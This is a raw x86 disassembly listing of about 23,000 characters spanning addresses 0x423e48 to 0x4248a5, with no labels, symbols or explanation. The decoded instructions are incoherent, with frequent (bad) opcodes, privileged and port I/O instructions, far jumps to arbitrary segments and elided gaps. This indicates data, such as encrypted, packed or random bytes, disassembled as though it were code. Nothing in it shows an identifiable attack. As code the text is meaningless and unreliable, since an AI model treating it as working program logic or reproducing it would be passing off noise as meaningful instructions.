  423e48:	imul   ebx,eax,0x537208e4
  423e4e:	test   ebp,edx
  423e50:	ret    
  423e51:	and    eax,0x4763256d
  423e56:	push   ebp
  423e57:	jp     0x423e44
  423e59:	iret   
  423e5a:	pusha  
  423e5b:	pop    ebp
  423e5c:	into   
  423e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e5e:	jle    0x423e66
  423e60:	lock aaa 
  423e62:	(bad)  
  423e63:	call   0x90d7:0xbe81752e
  423e6a:	pop    esi
  423e6b:	out    dx,al
  423e6c:	inc    ecx
  423e6d:	push   ebx
  423e6e:	mov    eax,ds:0x45baa581
  423e73:	xchg   ebp,eax
  423e74:	sahf   
  423e75:	stc    
  423e76:	stos   DWORD PTR es:[edi],eax
  423e77:	inc    ecx
  423e78:	data16 sbb BYTE PTR [ebx+0x1fc18522],dl
  423e7f:	mov    ch,0x4d
  423e81:	arpl   WORD PTR ds:0x5bc12aa0,sp
  423e87:	mov    BYTE PTR [eax+0x16],dh
  423e8a:	sub    dl,BYTE PTR [eax-0x3a512792]
  423e90:	lea    ebp,[ebx]
  423e92:	aaa    
  423e93:	shl    BYTE PTR [eax+ebp*1],1
  423e96:	(bad)  
  423e97:	cmp    al,0x94
  423e99:	xor    eax,edx
  423e9b:	add    ebp,DWORD PTR [edx-0x4eacb138]
  423ea1:	(bad)  
  423ea2:	jecxz  0x423e2a
  423ea4:	std    
  423ea5:	xor    DWORD PTR [edx-0x71],esp
  423ea8:	inc    ebp
  423ea9:	repnz cmp eax,ebx
  423eac:	jp     0x423f19
  423eae:	xor    BYTE PTR [edx],cl
  423eb0:	dec    eax
  423eb1:	jp     0x423e6d
  423eb3:	xchg   edx,eax
  423eb4:	icebp  
	...
  423f15:	add    BYTE PTR [esi+0x74b9649a],ch
  423f1b:	(bad)  
  423f1c:	call   FWORD PTR [edi+0x5086f531]
  423f22:	pusha  
  423f23:	jmp    DWORD PTR [ecx+0x3d]
  423f26:	call   0x1:0x700017e
  423f2d:	add    BYTE PTR [edx+0x5c],ch
  423f30:	jmp    0x35d0:0x249023ec
  423f37:	clc    
  423f38:	mov    ebx,0x6a0922f9
  423f3d:	inc    esi
  423f3e:	out    dx,al
  423f3f:	dec    esi
  423f40:	inc    esi
  423f41:	fs das 
  423f43:	jne    0x423ed7
  423f45:	sub    al,0x9d
  423f47:	das    
  423f48:	mov    edx,0x4fb4959
  423f4d:	enter  0xfe0b,0x38
  423f51:	jmp    0x9a9:0x5788b735
  423f58:	in     eax,0x40
  423f5a:	sbb    edx,DWORD PTR ds:0xc8e3720f
  423f60:	repz clc 
  423f62:	in     al,0x73
  423f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f65:	ja     0x423f8b
  423f67:	loopne 0x423f6e
  423f69:	fst    QWORD PTR [edx+0x7c0ce511]
  423f6f:	les    esp,FWORD PTR [ebx]
  423f71:	mov    BYTE PTR [ecx+eiz*2],ah
  423f74:	into   
  423f75:	push   ss
  423f76:	lock inc esi
  423f78:	jo     0x423ff8
  423f7a:	cmp    al,0x9a
  423f7c:	ins    DWORD PTR es:[edi],dx
  423f7d:	mov    al,ds:0xede89750
  423f82:	stos   BYTE PTR es:[edi],al
  423f83:	xor    al,0x6d
  423f85:	call   0x98641d28
  423f8a:	sbb    DWORD PTR [eax-0x5e],0x2b
  423f8e:	push   ds
  423f8f:	mov    ?,WORD PTR [ebx-0x7d]
  423f92:	ja     0x423fa3
  423f94:	test   ch,0x61
  423f97:	and    BYTE PTR [eax-0x146fa6ff],ah
  423f9d:	mov    bh,0x59
  423f9f:	dec    ebp
  423fa0:	dec    esi
  423fa1:	adc    eax,0x16ca1ff8
  423fa6:	das    
  423fa7:	mov    bl,0xe6
  423fa9:	mov    edi,0x5146bb23
  423fae:	dec    BYTE PTR [edi-0x551e8110]
  423fb4:	pop    eax
  423fb5:	xchg   ecx,eax
  423fb6:	sub    bl,BYTE PTR [ebx+eax*2-0x244e6da2]
  423fbd:	pop    esp
  423fbe:	scas   al,BYTE PTR es:[edi]
  423fbf:	pop    ecx
  423fc0:	xlat   BYTE PTR ds:[ebx]
  423fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fc2:	mov    ah,0xc5
  423fc4:	clc    
  423fc5:	stos   BYTE PTR es:[edi],al
  423fc6:	cmp    al,0xfe
  423fc8:	int3   
  423fc9:	pop    es
  423fca:	dec    eax
  423fcb:	loope  0x423fb4
  423fcd:	lahf   
  423fce:	fstp   DWORD PTR [edx-0x1e7c2f2d]
  423fd4:	icebp  
  423fd5:	mov    bl,0x1c
  423fd7:	imul   ebp,DWORD PTR ds:[eax+0x751180d3],0xffffffea
  423fdf:	mov    esi,0xa5f1dcac
  423fe4:	dec    ebx
  423fe5:	inc    esi
  423fe6:	xor    DWORD PTR [ebp+0x3c],edi
  423fe9:	addr16 adc al,0xe7
  423fec:	sbb    DWORD PTR [edx-0x70a9c661],eax
  423ff2:	push   eax
  423ff3:	jl     0x423f95
  423ff5:	rcl    DWORD PTR [edx-0x7f],cl
  423ff8:	stos   DWORD PTR es:[edi],eax
  423ff9:	pop    ebx
  423ffa:	push   ebx
  423ffb:	or     DWORD PTR [edx+0x19],edi
  423ffe:	dec    eax
  423fff:	out    dx,al
  424000:	stos   WORD PTR es:[edi],ax
  424002:	xor    eax,0x33f8d61d
  424007:	jmp    0x42402d
  424009:	fcom   DWORD PTR [esp+esi*4-0x7e266883]
  424010:	stos   DWORD PTR es:[edi],eax
  424011:	cmc    
  424012:	sbb    eax,0xb1c2e534
  424017:	mov    eax,0x7f703bc
  42401c:	(bad)  
  42401e:	aas    
  42401f:	dec    ecx
  424020:	pusha  
  424021:	test   BYTE PTR [eax+0x21],bl
  424024:	ss jbe 0x42402a
  424027:	add    bl,BYTE PTR [edx*2+0x15bdc579]
  42402e:	sti    
  42402f:	push   0x87129b74
  424034:	std    
	...
  424095:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424099:	mov    cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi-0x2155e30f]
  4240a3:	fstp   QWORD PTR [eax+0x17fa1ca]
  4240a9:	add    BYTE PTR [edi],al
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    BYTE PTR [ecx-0x4f2ccda7],dl
  4240b3:	fimul  DWORD PTR [ebp-0x41]
  4240b6:	or     DWORD PTR [esi],edi
  4240b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240b9:	mov    al,0xc1
  4240bb:	xor    al,bh
  4240bd:	xchg   edx,eax
  4240be:	inc    ebp
  4240bf:	fsubr  DWORD PTR [edi-0x7b5ab801]
  4240c5:	cmc    
  4240c6:	cmp    BYTE PTR [edi+0x2e482f7e],bl
  4240cc:	mov    ebx,0xe6739ef5
  4240d1:	outs   dx,BYTE PTR ds:[esi]
  4240d2:	push   0xfffffffd
  4240d4:	shr    bl,cl
  4240d6:	cmc    
  4240d7:	daa    
  4240d8:	sbb    al,0x35
  4240da:	in     eax,dx
  4240db:	loop   0x424123
  4240dd:	lahf   
  4240de:	xchg   esi,eax
  4240df:	add    BYTE PTR [edx+0x50f4c117],dh
  4240e5:	cdq    
  4240e6:	jle    0x4240ee
  4240e8:	add    DWORD PTR [edx-0x339bb067],ecx
  4240ee:	inc    edi
  4240ef:	sbb    ebp,DWORD PTR ds:0x5f2bfa03
  4240f5:	dec    ecx
  4240f6:	mov    esp,esi
  4240f8:	ja     0x42409e
  4240fa:	mov    edi,0x4579dc3e
  4240ff:	cwde   
  424100:	xor    esp,DWORD PTR [ecx]
  424102:	shr    DWORD PTR [edx-0x4bae4398],cl
  424108:	outs   dx,BYTE PTR ds:[esi]
  424109:	cmc    
  42410a:	jne    0x424109
  42410c:	jmp    0x7b64:0x888419a5
  424113:	mov    ebp,0x407a6d1e
  424118:	nop
  424119:	jne    0x4240cd
  42411b:	pop    ebp
  42411c:	ret    0x451f
  42411f:	pop    ebx
  424120:	in     eax,0x12
  424122:	call   0x7bde4d8e
  424127:	jl     0x4241a4
  424129:	and    eax,0x52eaf750
  42412e:	and    eax,0x954a4515
  424133:	pop    ds
  424134:	stos   BYTE PTR es:[edi],al
  424135:	frstpm(287 only) 
  424137:	cmp    ecx,esi
  424139:	inc    esi
  42413a:	dec    eax
  42413b:	xor    eax,0x150d4195
  424140:	fcmovbe st,st(5)
  424142:	mov    ch,0x81
  424144:	repnz add BYTE PTR [eax+0x7a526799],cl
  42414b:	call   0x3680:0x9e2ba8
  424152:	dec    ebp
  424153:	jge    0x424112
  424155:	add    eax,0x9201bf95
  42415a:	int    0x38
  42415c:	inc    edi
  42415d:	loop   0x4241aa
  42415f:	addr16 mov eax,ds:0xabb9
  424163:	xor    al,bl
  424165:	pop    esi
  424166:	add    dl,0xe2
  424169:	leave  
  42416a:	inc    edx
  42416b:	in     eax,dx
  42416c:	jle    0x42411f
  42416e:	scas   al,BYTE PTR es:[edi]
  42416f:	inc    esp
  424170:	arpl   WORD PTR ds:0xd14dfe61,di
  424176:	imul   ebp,DWORD PTR [ebx-0x36],0xffffff99
  42417a:	adc    al,0xbd
  42417c:	fs jb  0x4241ce
  42417f:	pmaxsw mm7,QWORD PTR [edi+0x76]
  424183:	lds    esp,FWORD PTR [eax]
  424185:	stc    
  424186:	fdiv   DWORD PTR [esi+0x2b9b773a]
  42418c:	inc    edx
  42418d:	mov    BYTE PTR [edi-0x73fa410a],bl
  424193:	sbb    esp,DWORD PTR [ebp+0x33]
  424196:	adc    DWORD PTR [edi-0x5f],esp
  424199:	xchg   esp,eax
  42419a:	pop    eax
  42419b:	mov    al,ds:0xc95a2f12
  4241a0:	ret    0x11fb
  4241a3:	ficomp WORD PTR [esi-0x234979f0]
  4241a9:	and    DWORD PTR [edi],0xffffffbb
  4241ac:	adc    edi,DWORD PTR [esi]
  4241ae:	int    0x88
  4241b0:	pop    es
  4241b1:	dec    edi
  4241b2:	pushf  
  4241b3:	mov    ebx,0xe8
	...
  424214:	add    BYTE PTR [eax],al
  424216:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42421d:	call   DWORD PTR [edi+0x63d4b417]
  424223:	sub    esi,ecx
  424225:	fisubr DWORD PTR [eax+0x7000180]
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    dl,dh
  42422f:	aaa    
  424230:	in     al,0x8
  424232:	in     al,0xf
  424234:	fwait
  424235:	fwait
  424236:	clc    
  424237:	xchg   BYTE PTR [edi+0x12519890],bh
  42423d:	outs   dx,DWORD PTR ds:[esi]
  42423e:	packuswb mm7,QWORD PTR [eax-0xf]
  424242:	dec    esi
  424243:	inc    esp
  424244:	shr    BYTE PTR [edx+0x7a],1
  424247:	adc    eax,0xa62fd74
  42424c:	mov    bh,0x7e
  42424e:	xor    eax,0x917ae944
  424253:	cdq    
  424254:	rcl    DWORD PTR [edx],cl
  424256:	mov    esp,DWORD PTR ds:0x340962af
  42425c:	cmp    ecx,ecx
  42425e:	xchg   esp,eax
  42425f:	ret    0x852f
  424262:	fcomi  st,st(0)
  424264:	in     eax,dx
  424265:	les    ebp,FWORD PTR [ebx]
  424267:	scas   al,BYTE PTR es:[edi]
  424268:	mov    edi,0xa9c73ec9
  42426d:	and    BYTE PTR [ebx+0x0],dl
  424270:	cmp    ebp,eax
  424272:	fild   QWORD PTR [ebp+eax*1-0x1937c522]
  424279:	int3   
  42427a:	push   0x3414956a
  42427f:	push   eax
  424280:	shl    BYTE PTR [ecx-0xa],1
  424283:	xor    eax,0x141b945b
  424288:	pusha  
  424289:	sbb    DWORD PTR [edi-0x5f],edi
  42428c:	scas   al,BYTE PTR es:[edi]
  42428d:	inc    edx
  42428e:	add    BYTE PTR [ebx+0x181a834b],cl
  424294:	fsubr  st(1),st
  424296:	mov    esi,0xa301404f
  42429b:	adc    eax,0x2e45b2ce
  4242a0:	inc    ebx
  4242a1:	pushw  ss
  4242a3:	inc    eax
  4242a4:	mul    ch
  4242a6:	call   0xbb5:0xf849aa34
  4242ad:	mov    esi,0x585cf593
  4242b2:	das    
  4242b3:	sbb    al,dl
  4242b5:	sbb    eax,eax
  4242b7:	push   ebx
  4242b8:	repnz push ss
  4242ba:	cdq    
  4242bb:	mov    eax,0x25c97340
  4242c0:	jge    0x424322
  4242c2:	ja     0x42433d
  4242c4:	mov    bh,0x86
  4242c6:	ret    0x48fa
  4242c9:	cmp    eax,0xd99671
  4242ce:	sbb    eax,0x8f43fe79
  4242d3:	call   0x45db:0x3febf076
  4242da:	out    dx,al
  4242db:	ror    dl,0x16
  4242de:	fmul   DWORD PTR [esi+0x5e]
  4242e1:	popa   
  4242e2:	mov    dl,0xbc
  4242e4:	jns    0x424341
  4242e6:	add    al,0x3a
  4242e8:	pop    es
  4242e9:	pop    ebp
  4242ea:	cmp    cl,0x72
  4242ed:	pop    esi
  4242ee:	mov    esp,0x405dc6f9
  4242f3:	lahf   
  4242f4:	in     eax,0x4a
  4242f6:	les    ebx,FWORD PTR [eax-0x49]
  4242f9:	push   cs
  4242fa:	mov    esi,0x8c07c4a
  4242ff:	shr    DWORD PTR [edi-0x6c],1
  424302:	jle    0x424356
  424304:	xchg   ebx,eax
  424305:	pop    ebp
  424306:	pop    edx
  424307:	(bad)  
  424308:	push   ecx
  424309:	ins    DWORD PTR es:[edi],dx
  42430a:	popa   
  42430b:	mov    ebp,0x28aeef43
  424310:	les    edx,FWORD PTR [edi+0x41b2a69d]
  424316:	push   ds
  424317:	lods   al,BYTE PTR ds:[esi]
  424318:	mov    ds:0xeb77bf46,al
  42431d:	dec    ebp
  42431e:	jno    0x42431f
  424320:	div    DWORD PTR [edx]
  424322:	mov    DWORD PTR [edi-0x3b],edx
  424325:	pusha  
  424326:	or     dh,ah
  424328:	xchg   dh,cl
  42432a:	push   ecx
  42432b:	test   BYTE PTR [ecx+0x12],dl
  42432e:	jmp    0x5f19:0x78026135
	...
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	add    BYTE PTR [ebp-0x7e50284e],bh
  4243a8:	add    DWORD PTR [eax],eax
  4243aa:	pop    es
  4243ab:	add    DWORD PTR [eax],eax
  4243ad:	add    BYTE PTR [eax-0x3],bl
  4243b0:	lds    ecx,FWORD PTR [edi-0x707cd663]
  4243b6:	adc    BYTE PTR [esi-0x27f6fb01],bh
  4243bc:	mov    eax,0xc3c5c2c2
  4243c1:	sbb    eax,0x6e0964b2
  4243c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243c7:	test   ebx,0xf588c081
  4243cd:	jne    0x424385
  4243cf:	adc    esp,DWORD PTR [eax-0x3cba48f]
  4243d5:	pop    esi
  4243d6:	pop    eax
  4243d7:	mov    ecx,0x8f16e560
  4243dc:	ror    BYTE PTR [ebx],cl
  4243de:	push   0xf60a2b1f
  4243e3:	stc    
  4243e4:	mov    ebp,0x172b0f2c
  4243e9:	or     al,dl
  4243eb:	rol    BYTE PTR fs:[edi-0x1],0xc3
  4243f0:	icebp  
  4243f1:	popa   
  4243f2:	bound  esp,QWORD PTR [edi+esi*8+0x5c10700a]
  4243f9:	mov    cl,0x16
  4243fb:	add    DWORD PTR [ebp-0x2b],ebp
  4243fe:	sbb    ch,BYTE PTR [edx+esi*2-0x5]
  424402:	jno    0x42444e
  424404:	jp     0x4243f8
  424406:	cld    
  424407:	lods   al,BYTE PTR ds:[esi]
  424408:	jecxz  0x4243c7
  42440a:	(bad)  
  42440b:	adc    esi,DWORD PTR [eax+0x1a]
  42440e:	adc    al,0x9e
  424410:	mov    cl,0x94
  424412:	pusha  
  424413:	sbb    al,0x94
  424415:	pop    eax
  424416:	js     0x4243d7
  424418:	adc    dl,dl
  42441a:	popf   
  42441b:	sub    bl,BYTE PTR [edi-0x474a80fa]
  424421:	jg     0x424458
  424423:	push   es
  424424:	in     eax,dx
  424425:	out    dx,eax
  424426:	cmc    
  424427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424428:	mov    BYTE PTR [edx+0x5da4b97e],bh
  42442e:	xchg   ebp,eax
  42442f:	ins    BYTE PTR es:[edi],dx
  424430:	and    al,0xda
  424432:	scas   eax,DWORD PTR es:[edi]
  424433:	icebp  
  424434:	int3   
  424435:	cmp    bl,BYTE PTR [esi+0x177d9ae5]
  42443b:	int    0xac
  42443d:	pop    edx
  42443e:	arpl   WORD PTR [esi+0x5d466c02],sp
  424444:	out    dx,al
  424445:	adc    BYTE PTR [edi],bl
  424447:	mov    DWORD PTR [eax],ecx
  424449:	call   0xdc47ae3d
  42444e:	outs   dx,DWORD PTR ds:[esi]
  42444f:	push   ds
  424450:	(bad)  [ebp+0x58e72fe4]
  424456:	push   DWORD PTR [esi]
  424458:	or     DWORD PTR [eax+0x5b],0xb2264894
  42445f:	sub    dl,BYTE PTR [edi-0x2f]
  424462:	fimul  WORD PTR [edx+edi*1]
  424465:	push   0xfffffff3
  424467:	jnp    0x4243f5
  424469:	ss pop es
  42446b:	sbb    eax,0xb810dae2
  424470:	mov    dl,0xc0
  424472:	and    dl,ch
  424474:	shl    DWORD PTR [edi],0x99
  424477:	fild   WORD PTR [edi+eax*2]
  42447a:	stos   DWORD PTR es:[edi],eax
  42447b:	inc    esp
  42447c:	jge    0x4244e6
  42447e:	ds inc edx
  424480:	jge    0x42448d
  424482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424483:	(bad)  
  424485:	inc    esp
  424486:	outs   dx,DWORD PTR ds:[esi]
  424487:	sahf   
  424488:	jmp    0x4244b8
  42448a:	push   esi
  42448b:	(bad)  
  42448c:	sbb    ecx,DWORD PTR [edx]
  42448e:	jle    0x42444e
  424490:	out    dx,al
  424491:	dec    eax
  424492:	mov    ebp,0xea05d765
  424497:	cli    
  424498:	and    eax,ecx
  42449a:	jbe    0x424487
  42449c:	mov    eax,ds:0x23b3b86
  4244a1:	pop    eax
  4244a2:	xchg   esp,eax
  4244a3:	jnp    0x424441
  4244a5:	aas    
  4244a6:	les    ecx,FWORD PTR [ebx+0x21ec612c]
  4244ac:	scas   eax,DWORD PTR es:[edi]
  4244ad:	mov    bl,0x2b
  4244af:	mov    esi,0x65bcd6ba
  4244b4:	add    eax,0x0
	...
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0x520ff3ab
  424523:	fwait
  424524:	(bad)  
  424525:	jo     0x4244dd
  424527:	add    BYTE PTR [ecx],0x0
  42452a:	pop    es
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    BYTE PTR [edx+0x54],bh
  424530:	fcom   DWORD PTR [ebx+esi*4]
  424533:	or     al,BYTE PTR [edx]
  424535:	mov    ds:0x8675e4ac,al
  42453a:	outs   dx,DWORD PTR ds:[esi]
  42453b:	(bad)  
  42453c:	jo     0x424551
  42453e:	and    BYTE PTR [esp+eax*4],bh
  424541:	mov    bh,0xb3
  424543:	outs   dx,DWORD PTR ds:[esi]
  424544:	clc    
  424545:	mov    gs:0x55e9ac5b,al
  42454b:	mov    eax,ds:0x7c29028c
  424550:	xor    DWORD PTR [ebp-0x17fa00a5],ecx
  424556:	wrmsr  
  424558:	gs push 0xba676575
  42455e:	jge    0x4244f5
  424560:	adc    DWORD PTR [edi+edx*8],esp
  424563:	mov    bl,0xfb
  424565:	aam    0x56
  424567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424568:	pop    edx
  424569:	push   ebp
  42456a:	xor    al,0x6e
  42456c:	cmp    ebp,DWORD PTR [edx+0x39]
  42456f:	push   edi
  424570:	push   eax
  424571:	xchg   esi,eax
  424572:	cwde   
  424573:	or     ebp,DWORD PTR [esi+0x6cd062b8]
  424579:	scas   eax,DWORD PTR es:[edi]
  42457a:	(bad)  
  42457b:	xchg   ecx,eax
  42457c:	test   DWORD PTR [eax-0x6c],ecx
  42457f:	jl     0x42450a
  424581:	mov    ebx,0xa54bbe5c
  424586:	shl    BYTE PTR [ecx],0xc4
  424589:	xchg   esp,eax
  42458a:	pop    eax
  42458b:	sahf   
  42458c:	out    dx,eax
  42458d:	outs   dx,DWORD PTR ds:[esi]
  42458e:	(bad)  
  42458f:	mov    edi,0x62e11889
  424594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424595:	nop
  424596:	pushf  
  424597:	rol    DWORD PTR [ebx+0x12b281bc],cl
  42459d:	imul   BYTE PTR [edx]
  42459f:	imul   ebp,DWORD PTR [esi-0x2d],0x66
  4245a3:	stc    
  4245a4:	xchg   esi,eax
  4245a5:	mov    ch,BYTE PTR [ebp+0x69]
  4245a8:	int    0xb0
  4245aa:	fisubr WORD PTR [esi]
  4245ac:	dec    DWORD PTR [eax-0x2d]
  4245af:	shl    esp,cl
  4245b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245b2:	imul   ebp,DWORD PTR [eax-0xf],0x5
  4245b6:	adc    bl,BYTE PTR [esp+eax*1+0x4c]
  4245ba:	and    DWORD PTR [ebx],esi
  4245bc:	aaa    
  4245bd:	loopne 0x4245fb
  4245bf:	dec    ecx
  4245c0:	xor    eax,0x506a0b8d
  4245c5:	pusha  
  4245c6:	inc    esp
  4245c7:	push   es
  4245c8:	fsubrp st(3),st
  4245ca:	(bad)  
  4245cb:	fcom   QWORD PTR [esp+ecx*2-0x42]
  4245cf:	sahf   
  4245d0:	retf   0x2a9a
  4245d3:	jl     0x42458e
  4245d5:	jmp    0xbede3843
  4245da:	mov    dh,0x7e
  4245dc:	and    al,0x2b
  4245de:	icebp  
  4245df:	rcl    BYTE PTR [ecx-0x5256ca77],1
  4245e5:	retf   0xac22
  4245e8:	stos   DWORD PTR es:[edi],eax
  4245e9:	add    esp,ecx
  4245eb:	scas   al,BYTE PTR es:[edi]
  4245ec:	fsubr  st(6),st
  4245ee:	and    al,0xa2
  4245f0:	inc    edi
  4245f1:	mov    ebp,cs
  4245f3:	dec    edi
  4245f4:	retf   
  4245f5:	xchg   ebx,eax
  4245f6:	dec    edi
  4245f8:	push   ecx
  4245f9:	xchg   esp,eax
  4245fa:	(bad)  
  4245fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245fd:	scas   eax,DWORD PTR es:[edi]
  4245fe:	sub    DWORD PTR [ecx+edi*2+0x5a],eax
  424602:	jp     0x42463b
  424604:	in     al,dx
  424605:	mov    al,ds:0x8f45a20b
  42460a:	push   ecx
  42460b:	mov    ds:0xc5d3806d,al
  424610:	fmulp  st(0),st
  424612:	dec    ecx
  424613:	sub    BYTE PTR [ebx+0x24ca2dd3],bh
  424619:	jne    0x42463c
  42461b:	ins    DWORD PTR es:[edi],dx
  42461c:	outs   dx,DWORD PTR ds:[esi]
  42461d:	jmp    0x81e09964
  424622:	jnp    0x424645
  424624:	xchg   cl,bh
  424626:	jmp    0x424677
  424628:	aad    0x27
  42462a:	pop    ebx
  42462b:	cmp    cl,BYTE PTR [edi]
  42462d:	sbb    esp,DWORD PTR [edi+0x67]
  424630:	out    dx,eax
  424631:	jnp    0x424601
  424633:	fsubr  QWORD PTR [eax+eax*1+0x0]
	...
  424696:	mov    esp,0xfefffc92
  42469b:	(bad)  
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    esi,DWORD PTR [ebp+ebx*1-0x65]
  4246a5:	mov    ebp,0x183bd
  4246aa:	pop    es
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    BYTE PTR [eax+0x52],dh
  4246b0:	inc    ebx
  4246b1:	mov    dl,0xb0
  4246b3:	push   esp
  4246b4:	punpckldq mm0,DWORD PTR fs:[eax-0x55]
  4246b9:	and    DWORD PTR [esp+ecx*8+0x64],0x20
  4246be:	cli    
  4246bf:	lods   eax,DWORD PTR ds:[esi]
  4246c0:	in     al,0xdd
  4246c2:	mov    dh,0x8a
  4246c4:	jl     0x42470b
  4246c6:	ins    DWORD PTR es:[edi],dx
  4246c7:	sti    
  4246c8:	pop    ds
  4246c9:	pop    esp
  4246ca:	or     DWORD PTR [ecx+0x3],esp
  4246cd:	scas   eax,DWORD PTR es:[edi]
  4246ce:	fimul  DWORD PTR ds:0x3ddc7d82
  4246d4:	scas   al,BYTE PTR es:[edi]
  4246d5:	sub    ecx,esp
  4246d7:	in     eax,0x3d
  4246d9:	pop    eax
  4246da:	sbb    ah,BYTE PTR ds:0xe3e21b99
  4246e0:	adc    DWORD PTR [esi],edi
  4246e2:	cmp    BYTE PTR [eax+0x1de617f9],al
  4246e8:	adc    esi,DWORD PTR [edx]
  4246ea:	mov    bh,0xf9
  4246ec:	xor    esp,ecx
  4246ee:	adc    eax,0x738ab0e1
  4246f3:	sbb    ah,BYTE PTR [ebx+0xbf72a55]
  4246f9:	sub    ebp,DWORD PTR [edi+edx*1]
  4246fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246fd:	pop    ebp
  4246fe:	cld    
  4246ff:	(bad)
  424702:	mov    edx,0x134a3cbe
  424707:	pop    esp
  424708:	add    bh,BYTE PTR [eax-0x4]
  42470b:	loop   0x4246d7
  42470d:	add    al,0xc0
  42470f:	dec    eax
  424710:	and    DWORD PTR [ecx+0x58148eb1],ecx
  424716:	js     0x424752
  424718:	inc    edi
  424719:	add    DWORD PTR [edx-0x3a],ebx
  42471c:	stos   BYTE PTR es:[edi],al
  42471d:	fsubr  DWORD PTR [ebp+eiz*8-0x3d]
  424721:	adc    DWORD PTR [ecx+0x1d],ecx
  424724:	mov    dh,BYTE PTR [ecx+0x11059e51]
  42472a:	(bad)  
  42472b:	vmread esi,ebx
  42472e:	xchg   edx,eax
  42472f:	xchg   ecx,eax
  424730:	call   0xd928ac7e
  424735:	push   edi
  424736:	jns    0x4246f7
  424738:	jo     0x424794
  42473a:	ja     0x42473f
  42473c:	jle    0x4246ca
  42473e:	push   esi
  42473f:	in     eax,0x7f
  424741:	add    edx,DWORD PTR [ecx*4-0x6baf308b]
  424748:	jp     0x4247af
  42474a:	adc    DWORD PTR [ecx+0x2c05f705],ebp
  424750:	ficomp DWORD PTR [edi-0x3dd5a5c8]
  424756:	xchg   ebp,eax
  424757:	cmp    DWORD PTR [ebp+0x7ce0741f],ebp
  42475d:	xor    esi,DWORD PTR [eax-0x76]
  424760:	test   BYTE PTR [edx-0x64aabf4a],0x7c
  424767:	adc    BYTE PTR [edx-0x18],0x12
  42476b:	pop    ebx
  42476c:	aad    0x66
  42476e:	and    DWORD PTR [edx],esp
  424770:	inc    eax
  424771:	test   eax,0x73ef3d10
  424776:	stos   BYTE PTR es:[edi],al
  424777:	in     al,0xae
  424779:	mov    edx,0x7ebd9018
  42477e:	clc    
  42477f:	sub    dl,0xec
  424782:	and    eax,0x981d6092
  424787:	lods   eax,DWORD PTR ds:[esi]
  424788:	xchg   esi,eax
  424789:	inc    ebp
  42478a:	mov    esi,0x61e58d70
  42478f:	mov    eax,ds:0x71175c25
  424794:	(bad)  
  424796:	mov    ds:0xc8f6b13c,al
  42479b:	lahf   
  42479c:	data16 daa 
  42479e:	xchg   ebp,eax
  42479f:	mov    WORD PTR [ebx-0x22bb2b35],gs
  4247a5:	loop   0x424741
  4247a7:	iret   
  4247a8:	enter  0x8f1,0x81
  4247ac:	cmp    ebp,DWORD PTR [ecx+edi*4+0x19]
  4247b0:	ins    DWORD PTR es:[edi],dx
  4247b1:	xchg   ebx,eax
  4247b2:	pop    edx
  4247b3:	imul   esi
	...
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax-0x396107de],0x93
  424825:	mov    esp,0x184c4
  42482a:	pop    es
  42482b:	add    DWORD PTR [eax],eax
  42482d:	add    BYTE PTR [esi-0x3798e97c],ch
  424833:	push   eax
  424834:	cs inc eax
  424836:	xchg   esi,eax
  424837:	jae    0x4248b3
  424839:	popa   
  42483a:	test   eax,0x5fa9db0a
  42483f:	sub    eax,0x18e07e83
  424844:	mov    BYTE PTR [ebp-0x384f0191],ch
  42484a:	mov    esi,0xb9fb9f0d
  42484f:	stc    
  424850:	dec    ebp
  424851:	aas    
  424852:	mov    ebx,?
  424854:	adc    eax,0xe38a5ad2
  424859:	ins    DWORD PTR es:[edi],dx
  42485a:	push   es
  42485b:	pop    eax
  42485c:	dec    edi
  42485d:	daa    
  42485e:	jo     0x4248da
  424860:	ja     0x4248bf
  424862:	adc    al,0xa2
  424864:	gs inc ebx
  424866:	leave  
  424867:	leave  
  424868:	add    DWORD PTR ds:0x8be99806,eax
  42486e:	cmovl  esi,DWORD PTR [esi-0x5d6410ad]
  424875:	sbb    BYTE PTR [ebp+0x3f],bl
  424878:	jnp    0x424849
  42487a:	ins    DWORD PTR es:[edi],dx
  42487b:	fcom   DWORD PTR [ebp-0x15a062a0]
  424881:	lea    ebp,[eax]
  424883:	jne    0x424815
  424885:	sbb    DWORD PTR [eax-0x21660f9d],ebp
  42488b:	and    BYTE PTR [ecx],dh
  42488d:	addr16 test eax,0x99b9e2c6
  424893:	ror    dh,cl
  424895:	sbb    DWORD PTR [esp+esi*4+0x2],eax
  424899:	mov    WORD PTR [eax+edx*2+0x4b],es
  42489d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42489e:	pop    ebp
  42489f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248a0:	adc    DWORD PTR [ecx+0x10],esi
  4248a3:	push   esp
  4248a4:	pop    eax
  4248a5:	and    al,0x77
